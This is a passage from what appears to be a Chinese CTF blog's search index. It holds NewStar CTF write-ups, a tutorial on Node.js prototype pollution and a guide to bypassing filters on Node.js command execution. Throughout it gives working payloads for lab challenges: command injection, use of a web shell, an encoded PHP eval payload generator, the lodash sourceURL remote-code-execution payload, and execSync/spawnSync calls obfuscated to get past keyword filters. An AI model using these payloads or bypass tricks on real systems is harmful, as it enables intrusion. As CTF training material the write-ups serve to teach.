$e) &#123;        die(&quot;表达式错误&quot;);    &#125;        if ($test == 2025) &#123;        $flag = generate_dynamic_flag($flag_secret);        echo &quot;&lt;div class=&#x27;success&#x27;&gt;拿下flag！&lt;/div&gt;&quot;;        echo &quot;&lt;div class=&#x27;flag-container&#x27;&gt;&lt;div class=&#x27;flag&#x27;&gt;FLAG: &#123;$flag&#125;&lt;/div&gt;&lt;/div&gt;&quot;;    &#125; else &#123;        echo &quot;&lt;div class=&#x27;error&#x27;&gt;大哥哥泥把数字算错了: $test ≠ 2025&lt;/div&gt;&quot;;    &#125;&#125; else &#123;    ?&gt;&lt;?php &#125; ?&gt;\n\nget:newstar=45*45\n\n\nflag&#123;b94f8e38-42e3-4ffd-b560-8be6869c8c1b&#125;\n\n别笑，你也过不了第二关在控制台输入两次；\nscore = 1000000; endLevel();\n\n\nflag&#123;2eb3b013-1c56-4dc9-b1e4-650ba7316da6&#125;\n\nDD加速器flag在环境变量\n127.0.0.1|env\n\n\nflag&#123;d4b77396-54ec-46b2-a5b0-3b9771c747f7&#125;\n\n白帽小K的故事（1）上传.htaccess和MP3一句话木马，经提示得知有一个/v1/onload接口读取文件内容，读取原有的star.mp3\n\n得到上传路径是/uploads/文件名，连蚁剑即可\n\nflag&#123;ddfab865-ca7b-42f7-9e50-0be8c57b6fb6&#125;\n\n\n\n搞点哦润吉吃吃橘前端得到密码Doro/Doro_nJlPVs_@123,登陆后抓包得到提示\n&#123;  &quot;expression&quot;: &quot;token = (1759727884 * 67102) ^ 0xe674c1&quot;,  &quot;hint&quot;:&quot;doro记得这里会在session里面添加验证参数, 也许Set-Cookie可以帮助我们......&quot;,  &quot;multiplier&quot;: 67102,  &quot;xor_value&quot;: &quot;0xe674c1&quot;&#125;\n\n得到的session很明显是flask&#x2F;python的itsdangerous 序列化签名 session，用flask-unsign解密一下\nD:\\CTF_TOOLS&gt;flask-unsign --decode --cookie &quot;.eJxNy00KhDAMQOG7ZN2F8a_atfcoZSZ0CrGVmIIg3n105_q974TPLzBTjuTXypo2TiTgRotNa15x1yDqNa0EDu0w29ZOU_8-jnI7HLDpcJwNcImRvj5lcCqVDNSdJIfHw1KkwPUHTT4pVQ.aONRDA.TdBxD8u9uANsFyA2PcQb7P99TNY&#123;&#x27;challenge_multiplier&#x27;: 67102, &#x27;challenge_start_time&#x27;: 1759727884, &#x27;challenge_xor&#x27;: 15103169, &#x27;logged_in&#x27;: True, &#x27;username&#x27;: &#x27;Doro&#x27;&#125;\n\n\n\n真的是签到诶&lt;?phphighlight_file(__FILE__);$cipher = $_POST[&#x27;cipher&#x27;] ?? &#x27;&#x27;;function atbash($text) &#123;  $result = &#x27;&#x27;;  foreach (str_split($text) as $char) &#123;    if (ctype_alpha($char)) &#123;      $is_upper = ctype_upper($char);      $base = $is_upper ? ord(&#x27;A&#x27;) : ord(&#x27;a&#x27;);      $offset = ord(strtolower($char)) - ord(&#x27;a&#x27;);      $new_char = chr($base + (25 - $offset));      $result .= $new_char;    &#125; else &#123;      $result .= $char;    &#125;  &#125;  return $result;&#125;if ($cipher) &#123;  $cipher = base64_decode($cipher);  $encoded = atbash($cipher);  $encoded = str_replace(&#x27; &#x27;, &#x27;&#x27;, $encoded);  $encoded = str_rot13($encoded);  @eval($encoded);  exit;&#125;$question = &quot;真的是签到吗？&quot;;$answer = &quot;真的很签到诶！&quot;;$res =  $question . &quot;&lt;br&gt;&quot; . $answer . &quot;&lt;br&gt;&quot;;echo $res . $res . $res . $res . $res;?&gt;\n\n编写对应解密脚本即可，先来分析一下一这段代码\natbash函数:\n对传进来的字符串text拆分成单个字符，并检查是不是字母，是字母的话计算偏移值（字母在字母表中的位置）用这个偏移值计算得到一个新的字符（a-z,b-y）\n我们输入的字符串会先经过base64解密，然后经过atbash加密，去掉空格后经过rot13加密，我们逆向回去即可\n原始代码 → ROT13 → 加空格(最好是空格用$&#123;IFS&#125;替换)→ Atbash → base64 \nimport base64import stringdef atbash(text):    &quot;&quot;&quot;    Apply Atbash cipher to the text.    Atbash is its own inverse.    &quot;&quot;&quot;    result = &#x27;&#x27;    for char in text:        if char.isalpha():            is_upper = char.isupper()            base = ord(&#x27;A&#x27;) if is_upper else ord(&#x27;a&#x27;)            offset = ord(char.lower()) - ord(&#x27;a&#x27;)            new_char = chr(base + (25 - offset))            result += new_char        else:            result += char    return resultdef rot13(text):    &quot;&quot;&quot;    Apply ROT13 cipher to the text.    ROT13 is its own inverse.    &quot;&quot;&quot;    trans = str.maketrans(        string.ascii_lowercase + string.ascii_uppercase,        string.ascii_lowercase[13:] + string.ascii_lowercase[:13] +        string.ascii_uppercase[13:] + string.ascii_uppercase[:13]    )    return text.translate(trans)def craft_payload(mycode):    &quot;&quot;&quot;    Craft the base64-encoded payload for the PHP script.        Args:        mycode (str): The PHP code to execute via eval (without spaces).        Returns:        str: The base64-encoded cipher value to POST.    &quot;&quot;&quot;    # Step 1: Apply ROT13 to mycode (reverse of str_rot13)    inter = rot13(mycode)        # Step 2: Since spaces are removed after atbash, ensure no spaces in inter    # (assuming mycode has no spaces; adjust if needed)    if &#x27; &#x27; in inter:        raise ValueError(&quot;Input code should not introduce spaces after ROT13&quot;)        # Step 3: Apply atbash to inter (reverse of atbash)    decoded = atbash(inter)        # Step 4: Base64 encode the decoded    payload = base64.b64encode(decoded.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)        return payload# Example usage:if __name__ == &quot;__main__&quot;:    mycode = &quot;system(&#x27;cat$&#123;IFS&#125;/f*&#x27;);&quot;        cipher = craft_payload(mycode)    print(f&quot;POST cipher: &#123;cipher&#125;&quot;)    print(&quot;\\nVerification (forward simulation):&quot;)    dec = base64.b64decode(cipher.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)    atb = atbash(dec)    no_space = atb.replace(&#x27; &#x27;, &#x27;&#x27;)    rot = rot13(no_space)    print(f&quot;Eval code: &#123;rot&#125;&quot;)\n\n\nflag&#123;f3c98f57-9725-44bd-aca4-266014083b38&#125;\n\nmisc我不要革命失败下载windbg后打开题目附件，运行!analyze -v\n\n\nflag&#123;CRITICAL_PROCESS_DIED_svchost.exe&#125;\n\nMISC城邦-压缩术有题目可知先是6位数字+小写字母密码爆破,用kali自带的工具爆破\nzip2john misc.zip &gt; zip.hashcrunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 | john --stdin zip.hash\n\n\n找到密码是ns2025，解压得到一个明文key.txt和加密压缩包，加密压缩包是一层伪加密，得到加密的flaaaaggg.txt和key.txt文件。我们已经知道key.txt的内容，直接明文攻击就行\nbkcrack -C flag.zip -c key.txt -p key.txt -o 0\n\n\n得到密钥\nc5a43985 0efe59a5 5dfb3167\n\n然后破解密码即可\nbkcrack -C flag.zip -c flagggggg.txt -k c5a43985 0efe59a5 5dfb3167 -d decrypted_flag.txt\n\n\nflag&#123;You_have_mastered_the_zip_magic!&#125;\n\nEZ_fence修改宽高，得到新的图片\n\nOSINT-天空belong拍摄设备在属性里查\n\nflag&#123;UQ3574_武汉市_Xiaomi&#125;\n\n星期四的狂想美妙的音乐搞半天，原来这么简单\n\n出题的你自己来看看能看得清吗\nflag&#123;thi5_1S_m1Di_5tEG0&#125;\n\n##日志分析-不敬者的闯入\n搜索200发现有个/admin路由可以进去\n\n\nflag&#123;88bb2046-000e-4ed4-b8db-d05b79d53162&#125;\n\nOSINT-威胁情报把题目给gpt就出了？\nhttps://any.run/report/2c796053053a571e9f913fd5bae3bb45e27a9f510eace944af4b331e802a4ba0/53de102c-beab-40fd-9a3f-4bcfeda4c7e7\n\nflag&#123;kimsuky_alps.travelmountain.ml_2021-03-31&#125;\n\n"},{"title":"node.js原型链污染","url":"/2025/09/13/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","content":"v\n上学期接触过node.js原型链污染漏洞,不过当时没太学懂,现在再来总结一下,并配上一些例题\n概要在js对象有一条指向原型对象的链。当试图访问对象的属性时，不仅在该对象上查找属性，还会在该对象的原型上查找属性，以及原型的原型，依此类推，直到找到一个名字匹配的属性或到达原型链的末尾。\n关于原型链\n在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。例如:\nobject.prototype.name=value\n\n在javascript中,每一个实例对象都有一个__proto__属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象(个人感觉有点像python里的基类)\nobjectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype\n\n不同对象所生成的原型链如下(部分)：\nvar o = &#123;a: 1&#125;;// o对象直接继承了Object.prototype// 原型链：// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// 数组都继承于 Array.prototype// 原型链：// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;  return 2;&#125;// 函数都继承于 Function.prototype// 原型链：// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null\n\n原型链污染原理对于语句：object[a][b] = value 如果可以控制a、b、value的值，将a设置为__proto__，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value\n来个简单的例子:\nobject1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);\n\n\n最终会输出两个Hello World。为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。\n在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。\n什么情况下原型链会被污染在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？\n我们思考一下，哪些情况下我们可以设置__proto__的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：\n\n对象merge\n对象clone（其实内核就是将待操作的对象merge到一个空对象中）\n\n以对象merge为例，我们想象一个简单的merge函数：\nfunction merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key], source[key])        &#125; else &#123;            target[key] = source[key]        &#125;    &#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)\n\n这是一个递归合并函数，把 source 的属性合并到 target。\n需要注意的点是：\n在JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。\n结果:\n\n可见object3的b是从原型中获取到的，说明Object已经被污染了\n例题ctfshow-338漏洞代码:\nutils&#x2F;common.js\nfunction copy(object1, object2)&#123;    for (let key in object2) &#123;        if (key in object2 &amp;&amp; key in object1) &#123;            copy(object1[key], object2[key])        &#125; else &#123;            object1[key] = object2[key]        &#125;    &#125;  &#125;\n\n经典merge方法原型链污染 \nroutes&#x2F;login.js\nrouter.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var secert = &#123;&#125;;  var sess = req.session;  let user = &#123;&#125;;  utils.copy(user,req.body);  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;    res.end(flag);  &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);    &#125;&#125;);\n\n我们只要污染user数组的原型,让这个原型带有ctfshow这个属性并且设置为36dboy,就能得到flag\n登录界面抓包,传入\n&#123;&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;\n\n即可污染secert,使它存在一个ctfshow属性并且值为36dboy\n\nctfshow&#123;78f9e56a-c10a-4d37-ae7e-ed4653f0b3b8&#125;\n\nCode-Breaking 2018 Thejsapp.js:\nconst fs = require(&#x27;fs&#x27;)const express = require(&#x27;express&#x27;)const bodyParser = require(&#x27;body-parser&#x27;)const lodash = require(&#x27;lodash&#x27;)const session = require(&#x27;express-session&#x27;)const randomize = require(&#x27;randomatic&#x27;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#x27;/static&#x27;, express.static(&#x27;static&#x27;))app.use(session(&#123;    name: &#x27;thejs.session&#x27;,    secret: randomize(&#x27;aA0&#x27;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#x27;views&#x27;, &#x27;./views&#x27;)app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;)app.all(&#x27;/&#x27;, (req, res) =&gt; &#123;    // 定义session    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#x27;POST&#x27;) &#123;        // 获取post数据并合并        data = lodash.merge(data, req.body)        req.session.data = data        // 再将data赋值给session    &#125;    res.render(&#x27;index&#x27;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(&#x27;Example app listening on port 3000!&#x27;))\n\n漏洞代码:\napp.all(&#x27;/&#x27;, (req, res) =&gt; &#123;    // 定义session    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#x27;POST&#x27;) &#123;        // 获取post数据并合并        data = lodash.merge(data, req.body)        req.session.data = data        // 再将data赋值给session    &#125;    res.render(&#x27;index&#x27;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)\n\nlodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：\n\nlodash.template 一个简单的模板引擎\nlodash.merge 函数或对象的合并\n\n问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。\n页面最终会通过lodash.template进行渲染，跟踪到lodash&#x2F;template.js中。原始代码如下:\nhttps://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165\nvar sourceURL = &#x27;sourceURL&#x27; in options ? &#x27;//# sourceURL=&#x27; + options.sourceURL + &#x27;\\n&#x27; : &#x27;&#x27;;// ...var result = attempt(function() &#123;  return Function(importsKeys, sourceURL + &#x27;return &#x27; + source)  .apply(undefined, importsValues);&#125;);\n\n\n如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。\nvar sourceURL = &#x27;sourceURL&#x27; in options ? &#x27;//# sourceURL=&#x27; + options.sourceURL + &#x27;\\n&#x27; : &#x27;&#x27;;\n\n如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。\n继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：\nvar result = attempt(function() &#123;    return Function(importsKeys, sourceURL + &#x27;return &#x27; + source)      .apply(undefined, importsValues);  &#125;);\n\n最终可以构造一个简单的Payload作为传递给主页面的的POST数据(p牛的payload)：\n&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;\\n//&quot;&#125;&#125;\n","categories":["node.js"],"tags":["node.js 原型链污染"]},{"title":"node.js命令执行","url":"/2025/09/13/node-js%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","content":"node.js中的命令执行child_process首先介绍一下nodejs中用来执行系统命令的模块child_process。Nodejs通过使用child_process模块来生成多个子进程来处理其他事物。在child_process中有七个方法它们分别为：execFileSync、spawnSync,execSync、fork、exec、execFile、以及spawn,而这些方法使用到的都是spawn()方法。\nrequire(&quot;child_process&quot;).exec(&quot;sleep 3&quot;);require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;);require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); //调用某个可执行文件，在第二个参数传argsrequire(&quot;child_process&quot;).spawn(&#x27;sleep&#x27;, [&#x27;3&#x27;]);require(&quot;child_process&quot;).spawnSync(&#x27;sleep&#x27;, [&#x27;3&#x27;]);require(&quot;child_process&quot;).execFileSync(&#x27;sleep&#x27;, [&#x27;3&#x27;]);\n\n正常的node.js命令执行:\nrequire(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;);\n\n动态的一种绕过某些限制（比如模块缓存或包管理器的限制）的方法\nglobal.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)\n\n其中,global.process.mainModule.constructor._load来动态导入child_process模块\nnode.js中如何访问属性\n\n用.访问对象的属性\n\n用[]访问属性\n\n\n以下是一个简单的代码示例:\nconst express = require(&#x27;express&#x27;)const bodyParser = require(&#x27;body-parser&#x27;)const app = express()app.use(bodyParser.urlencoded(&#123; extended: true &#125;))app.post(&#x27;/&#x27;, function (req, res) &#123;    code = req.body.code;    console.log(code);    res.send(eval(code));&#125;)app.listen(3000)\n\n原理很简单，就是接受post方式传过来的code参数，然后返回eval(code)的结果。可以用以下的payload来rce\neval(&#x27;require(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&#x27;)\n\nnode.js中的命令绕过参考:https://www.anquanke.com/post/id/237032#h2-0\n编码绕过\n16进制绕过 \\x61\n第一种思路是16进制编码，原因是在nodejs中，如果在字符串内用16进制，和这个16进制对应的ascii码的字符是等价的\nconsole.log(&quot;a&quot;===&quot;\\x61&quot;);// true\n\n但是在正则匹配的时候，16进制却不会转化成字符，所以就可以绕过正则的校验。所以可以传\nrequire(&quot;child_process&quot;)[&quot;exe\\x63Sync&quot;](&quot;curl 127.0.0.1:1234&quot;)\n\nunicode编码绕过 ”反斜杠+u+码点” \\u0061\n思路跟上面是类似的，由于JavaScript允许直接用码点表示Unicode字符，写法是”反斜杠+u+码点”，所以我们也可以用一个字符的unicode形式来代替对应字符。\nconsole.log(&quot;\\u0061&quot;===&quot;a&quot;);// truerequire(&quot;child_process&quot;)[&quot;exe\\u0063Sync&quot;](&quot;curl 127.0.0.1:1234&quot;)\n\nbase64编码绕过\neval(Buffer.from(&#x27;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&#x27;,&#x27;base64&#x27;).toString())\n\n这些都是对字符操作，就是 被引号或者反引号包裹起来的字符\n&quot;&quot;&#x27;&#x27;``\n\n拼接绕过\n加号+拼接\n原理很简单，加号在js中可以用来连接字符，所以可以这样\nrequire(&#x27;child_process&#x27;)[&#x27;exe&#x27;%2b&#x27;cSync&#x27;](&#x27;curl 127.0.0.1:1234&#x27;)\n\nconcat拼接\n利用js中的concat函数连接字符串\nrequire(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;curl 127.0.0.1:1234&quot;)\n\n模板字符串nodejs中 &#96;&#96; 等价于 引号\n比较特殊的是占位符 $&#123;expression&#125; 可以镶套变量\n`$&#123;&#125;`被``包裹\n\n$&#123;&#125;拼接的字符串汇总这里总结一下$&#123;&#125;拼接的字符串，以便快速使用\nprocess     \t`$&#123;`$&#123;`proce`&#125;ss`&#125;`prototype\t\t`$&#123;`$&#123;`prototyp`&#125;e`&#125;`get_process\t\t`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`require\t\t\t`$&#123;`$&#123;`requir`&#125;e`&#125;`execSync\t\t`$&#123;`$&#123;`exe`&#125;cSync`&#125;`return process\t`$&#123;`$&#123;`return proc`&#125;ess`&#125;`constructor\t\t`$&#123;`$&#123;`constructo`&#125;r`&#125;`child_process\t`$&#123;`$&#123;`child_proces`&#125;s`&#125;`\n\n例如:\nrequire(&#x27;child_process&#x27;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#x27;curl 127.0.0.1:1234&#x27;)\n\nObejct.keys实际上通过require导入的模块是一个Object，所以就可以用Object中的方法来操作获取内容。利用Object.values就可以拿到child_process中的各个函数方法，Object.values(obj) 会返回对象中 值的数组，再通过数组下标就可以拿到execSync\nObject.values(require(&#x27;child_process&#x27;))[5](&#x27;curl 127.0.0.1:1234&#x27;)\n\n等价于nodejs中的命令执行\n反射可以进行模糊调用，实际作用比不上模板字符串\n通过Reflect这个关键字来实现反射调用函数的方式\n要得到eval函数，可以首先通过Reflect.ownKeys(global)拿到所有函数，然后global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))]即可得到eval\nconsole.log(Reflect.ownKeys(global)) //返回所有函数console.log(global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;eval&#x27;))])//得到eval\n\n\n替换成:\nconsole.log(global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;ev&#x27;))])\n\n也是可以的\n\n也可以替换为\nconsole.log(global[Reflect.ownKeys(global).find(x=&gt;x.startsWith(&#x27;eva&#x27;))])注意不是startswith\n\n过滤中括号的情况获取到eval的方式是通过global数组，其中用到了中括号[]，假如中括号被过滤，可以用Reflect.get来绕\nReflect.get(target, propertyKey[, receiver])//作用是获取对象身上某个属性的值，类似于target[name]\n\n可以拿对象的属性,执行任意命令\nReflect.get(global, Reflect.ownKeys(global).find(x =&gt; x.includes(&#x27;eva&#x27;)))(&quot;console.log(\\&quot;123\\&quot;);&quot;);\n\n解释一下这段代码:\n\nReflect.ownKeys(global)\n\n\n获取 global 对象的 所有自有属性的 key（包括不可枚举属性）。\n在 Node.js 里，global 相当于浏览器的 window，里面有各种全局函数和对象。\n其中有一个关键属性就是 eval（全局的代码执行函数）。\n\n\n.find(x =&gt; x.includes(&#39;eva&#39;))\n\n\n遍历所有 key，找第一个包含 &#39;eva&#39; 的名字。\n正好会匹配到 &quot;eval&quot;。\n\n\nReflect.get(global, &quot;eval&quot;)\n\n\n从 global 对象里取出 eval 函数。\n\n等价于 global.eval。\n\n\n\n调用结果:\n\n\n执行eval(&quot;console.log(\\&quot;123\\&quot;);&quot;);\n\njavascript大小写特性在javascript中有几个特殊的字符需要记录一下\n对于toUpperCase():\n字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;\n\n对于toLowerCase():\n字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)\n\n在绕一些规则的时候就可以利用这几个特殊字符进行绕过\n例题[GFCTF 2021]ez_calcif(req.body.username.toLowerCase() !== &#x27;admin&#x27; &amp;&amp; req.body.username.toUpperCase() === &#x27;ADMIN&#x27; &amp;&amp; req.body.passwd === &#x27;admin123&#x27;)&#123;        // 登录成功，设置 session&#125;\n\nusername设置成admınpassword设置成admin123\n登录后得到源码\nlet calc = req.body.calc;let flag = false;//waffor (let i = 0; i &lt; calc.length; i++) &#123;    if (flag || &quot;/(flc&#x27;\\&quot;.&quot;.split``.some(v =&gt; v == calc[i])) &#123;        flag = true;        calc = calc.slice(0, i) + &quot;*&quot; + calc.slice(i + 1, calc.length);    &#125;&#125;//截取calc = calc.substring(0, 64);//去空calc = calc.replace(/\\s+/g, &quot;&quot;);calc = calc.replace(/\\\\/g, &quot;\\\\\\\\&quot;);//小明的同学过滤了一些比较危险的东西while (calc.indexOf(&quot;sh&quot;) &gt; -1) &#123;    calc = calc.replace(&quot;sh&quot;, &quot;&quot;);&#125;while (calc.indexOf(&quot;ln&quot;) &gt; -1) &#123;    calc = calc.replace(&quot;ln&quot;, &quot;&quot;);&#125;while (calc.indexOf(&quot;fs&quot;) &gt; -1) &#123;    calc = calc.replace(&quot;fs&quot;, &quot;&quot;);&#125;while (calc.indexOf(&quot;x&quot;) &gt; -1) &#123;    calc = calc.replace(&quot;x&quot;, &quot;&quot;);&#125;try &#123;    result = eval(calc);&#125;\n\n解释一下代码:\n检测当前元素是否非法（或之前已经发现过非法元素）。\n一旦触发，就 把 flag 置为 true，确保之后每个元素都进入替换逻辑。\n用 &quot;\\*&quot; 替换当前元素（但因为 + 拼接，数组被转换成字符串）。\n提示:\n1.别想太复杂，试着传传其他数据类型2.字符串的length和数组的length是不一样的。你能将自己的payload逃逸出来吗。\n\n可以在本地进行测试\nlet calc = &quot;aaaa.aaa&quot;;let flag = false;//waffor (let i = 0; i &lt; calc.length; i++) &#123;    if (flag || &quot;/(flc&#x27;\\&quot;.&quot;.split``.some(v =&gt; v == calc[i])) &#123;        flag = true;        calc = calc.slice(0, i) + &quot;*&quot; + calc.slice(i + 1, calc.length);    &#125;&#125;console.log(calc)//\n\n\n非法字符后的字符都替换成 ****\n再进行测试\nlet calc = [&#x27;aaaaaaaaaa&#x27;,&#x27;bbbb&#x27;,&#x27;.&#x27;];let flag = false;console.log(calc.length)//waffor (let i = 0; i &lt; calc.length; i++) &#123;    if (flag || &quot;/(flc&#x27;\\&quot;.&quot;.split``.some(v =&gt; v == calc[i])) &#123;        flag = true;        calc = calc.slice(0, i) + &quot;*&quot; + calc.slice(i + 1, calc.length);    &#125;&#125;console.log(calc)\n\n\n在数组的第三个元素发现非法字符,但是slice是从第三的元素开始替换\n存在逻辑问题，可以逃逸前三个字符（任意值）\n\n因为禁止了x,不能出现exec,可以用require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]);\n直接调用 spawnSync(&#39;sleep&#39;, [&#39;3&#39;]) 而没有将其结果赋值给一个变量时，Node.js 仍然会执行 sleep 命令并等待 3 秒，但你不会看到任何输出或结果，因为你没有处理这个返回的对象\nrequire(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString();\n\n把结果输出即可\nre = 0s = &quot;require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString();&quot;print(s.__len__())print(&quot;&amp;calc[]=1&quot;*s.__len__())\n\ncalc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.\n\n\n尝试cat &#x2F;G*,发现没有回显,将这个文件写入静态文件a中\ncalc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$IFS$9/G*&gt;a&#x27;).toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=